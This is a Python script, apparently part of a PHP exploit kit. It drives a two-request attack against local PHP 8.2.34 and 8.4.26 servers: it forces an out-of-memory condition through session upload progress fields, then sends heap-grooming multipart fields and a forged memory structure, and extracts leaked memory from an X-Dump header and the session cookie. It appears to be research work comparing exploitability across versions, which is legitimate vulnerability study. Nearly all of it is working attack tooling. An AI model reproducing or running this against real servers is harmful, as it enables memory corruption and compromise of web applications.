#!/usr/bin/env python3
"""Compare 8.2.34 vs 8.4.26 session state after OOM (reqA) + reqB with forge."""
import os
import sys, time, struct, re, base64
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, Exploit, build_multipart

def run(port, label):
    t = Target(f"http://127.0.0.1:{port}/index.php", timeout=90.0, verbose=False)
    ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")
    # reqA: OOM
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              ex._file_part(), ex._big_field()]
    rA = t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=1<<20)
    time.sleep(0.3)
    # reqB: with forge, capture X-Dump
    parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(841):
        parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
    forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18]=ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    rB = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
    # extract X-Dump
    m = re.search(rb"X-Dump: ([A-Za-z0-9+/=]+)", rB)
    dump = base64.b64decode(m.group(1)).decode("latin1") if m else "(no X-Dump)"
    cookie = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?);", rB)
    clen = len(cookie.group(1)) if cookie else 0
    print(f"=== {label} (port {port}) ===")
    print(f"  cookie len={clen}")
    print(dump)
    print()

run(18111, "8.2.34")
run(18113, "8.4.26")
